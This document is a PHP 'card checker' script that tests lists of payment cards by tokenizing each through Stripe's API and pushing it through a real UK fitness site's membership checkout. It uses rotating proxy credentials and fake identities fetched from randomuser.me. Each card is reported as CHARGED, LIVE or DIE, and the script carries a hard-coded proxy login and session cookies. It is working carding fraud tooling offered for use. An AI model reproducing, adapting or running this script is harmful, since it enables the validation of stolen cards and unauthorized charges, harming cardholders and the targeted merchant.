<?php



 



require 'function.php';



error_reporting(0);

date_default_timezone_set('Asia/Jakarta');



if ($_SERVER['REQUEST_METHOD'] == "POST") {

    extract($_POST);

} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {

    extract($_GET);

}

function GetStr($string, $start, $end) {

    $str = explode($start, $string);

    $str = explode($end, $str[1]);  

    return $str[0];

}

function inStr($string, $start, $end, $value) {

    $str = explode($start, $string);

    $str = explode($end, $str[$value]);

    return $str[0];

}

$separa = explode("|", $lista);

$cc = $separa[0];

$mes = $separa[1];

$ano = $separa[2];

$cvv = $separa[3];



function rebootproxys()

{

  $poxySocks = file("proxy.txt");

  $myproxy = rand(0, sizeof($poxySocks) - 1);

  $poxySocks = $poxySocks[$myproxy];

  return $poxySocks;

}

$poxySocks4 = rebootproxys();



$number1 = substr($ccn,0,4);

$number2 = substr($ccn,4,4);

$number3 = substr($ccn,8,4);

$number4 = substr($ccn,12,4);

$number6 = substr($ccn,0,6);



function value($str,$find_start,$find_end)

{

    $start = @strpos($str,$find_start);

    if ($start === false) 

    {

        return "";

    }

    $length = strlen($find_start);

    $end    = strpos(substr($str,$start +$length),$find_end);

    return trim(substr($str,$start +$length,$end));

}



function mod($dividendo,$divisor)

{

    return round($dividendo - (floor($dividendo/$divisor)*$divisor));

}









//==================[Randomizing Details]======================//

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');

preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);

$name = $matches1[1][0];

preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);

$last = $matches1[1][0];

preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);

$email = $matches1[1][0];

preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);

$street = $matches1[1][0];

preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);

$city = $matches1[1][0];

preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);

$state = $matches1[1][0];

preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);

$phone = $matches1[1][0];

preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);

$postcode = $matches1[1][0];

//==================[Randomizing Details-END]======================//





//=======================[Proxys]=============================//

$Websharegay = rand(0,250);

$rp1 = array(

  1 => 'wcfsaunx-rotate:agpoevat7mxr',

    ); 

    $rotate = $rp1[array_rand($rp1)];

//////////////////////////==============[Proxy Section]===============//////////////////////////////

//=======================[Proxys END]=============================//





//=======================[1 REQ]==================================//

$ch = curl_init();

//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 

curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');

curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_POST, 1);

curl_setopt($ch, CURLOPT_HTTPHEADER, array(

    'authority: api.stripe.com',

    'method: POST',

    'path: /v1/payment_methods',

    'scheme: https',

    'accept: application/json',

    'accept-language: en-US,en;q=0.9,id;q=0.8',

    'content-type: application/x-www-form-urlencoded',

    'origin: https://js.stripe.com',

    'referer: https://js.stripe.com',

    'sec-fetch-dest: empty',

    'sec-fetch-mode: cors',

    'sec-fetch-site: same-site',

    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',

));

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=74df3b40-c8f5-4289-8d2a-caf66cd78efb9db996&muid=7417570e-5c69-446c-8877-e516f32a9db60808c5&sid=552bb17a-d76a-4861-8e12-664a317134b669df9d&pasted_fields=number&payment_user_agent=stripe.js%2Ff0920f3ce%3B+stripe-js-v3%2Ff0920f3ce&time_on_page=31241&key=pk_live_JRuq9k2UAfD2UAmZhon0O5MX');





$result1 = curl_exec($ch);

$token = trim(strip_tags(getStr($result1,'"id": "','"'))); 

//=======================[1 REQ-END]==============================//





//=======================[2 REQ]==================================//

$ch = curl_init();

//curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 

curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);

curl_setopt($ch, CURLOPT_URL, 'https://www.workoutwithtasha.co.uk/membership-account/membership-checkout/?level=16');

curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch, CURLOPT_POST, 1);

curl_setopt($ch, CURLOPT_HTTPHEADER, array(

    'authority: www.workoutwithtasha.co.uk',

    'method: POST',

    'path: /membership-account/membership-checkout/?level=16',

    'scheme: https',

    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',

    'accept-language: en-US,en;q=0.9,id;q=0.8',

    'content-type: application/x-www-form-urlencoded',

    'cookie: PHPSESSID=1d56b586f924acc9f3a196c6b1e0ac8b; pmpro_visit=1; __stripe_mid=7417570e-5c69-446c-8877-e516f32a9db60808c5; __stripe_sid=552bb17a-d76a-4861-8e12-664a317134b669df9d',

    'origin: https://www.workoutwithtasha.co.uk',

    'referer: https://www.workoutwithtasha.co.uk/membership-account/membership-checkout/?level=16',

    'sec-fetch-dest: document',

    'sec-fetch-mode: navigate',

    'sec-fetch-site: same-origin',

    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',

));

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=16&checkjavascript=1&other_discount_code=&username='.$name.'&password=kambing77&password2=kambing77&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&CardType=visa&discount_code=&tos=1&submit-checkout=1&javascriptok=1&payment_method_id='.$token.'&AccountNumber=XXXXXXXXXXXX8720&ExpirationMonth=01&ExpirationYear=2027');



$result2 = curl_exec($ch);

$info = curl_getinfo($ch);

$time = $info['total_time'];



//=======================[2 REQ-END]==============================//



//===========================================[Responses]========================================//





if(strpos($result2, 'Thanks for')) {

  

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED ✅ @mtctechx</span><br>';

    exit;

    }





elseif(strpos($result2, "Your card has insufficient funds.")) {

  

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV INSUFFICIENT FUNDS ⚠️  『žє𝒹』</span><br>';

    exit;

    }



 

elseif(strpos($result2, "Your card’s security code is incorrect.")) {



    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅ 『žє𝒹』</span><br>';

    }    

 

 

elseif(strpos($result2, "Your card was declined.")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ </span><br>';

    }





elseif(strpos($result2, "Your card number is incorrect.")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER ❌ </span><br>';

    }



elseif(strpos($result1, "Your card number is incorrect.")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER ❌ </span><br>';

    }



elseif(strpos($result1, "do_not_honor")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ </span><br>';



}





elseif(strpos($result1, "fraudulent")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ </span><br>';



}



elseif(strpos($result2, "Your card number is incorrect.")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER ❌ </span><br>';



}



elseif(strpos($result2, "Unkown Error Generation Your Account.")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>';



}





else {



    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅ 『žє𝒹』</span><br>';



}



//===========================================[Responses-END]========================================//



curl_close($ch);

ob_flush();



#echo "<b>1REQ Result:</b> $result1<br><br>";

#echo "<b>2REQ Result:</b> $result2<br><br>";







?>